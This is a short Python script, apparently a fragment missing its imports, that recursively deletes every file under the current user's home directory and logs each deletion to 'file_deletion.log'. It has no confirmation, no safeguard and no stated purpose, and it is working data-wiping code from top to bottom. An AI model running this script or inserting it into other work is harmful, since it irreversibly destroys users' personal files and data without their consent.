logging.basicConfig(filename='file_deletion.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def delete_file(file_path):
    try:
        os.remove(file_path)
        logging.info(f"Deleted file: {file_path}")
    except OSError as e:
        logging.error(f"Error deleting file: {file_path} - {e}")

def recursive_delete(directory):
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            delete_file(item_path)
        elif os.path.isdir(item_path):
            recursive_delete(item_path)

def main():
    home_directory = os.path.expanduser('~')
    recursive_delete(home_directory)

if __name__ == "__main__":
    main()
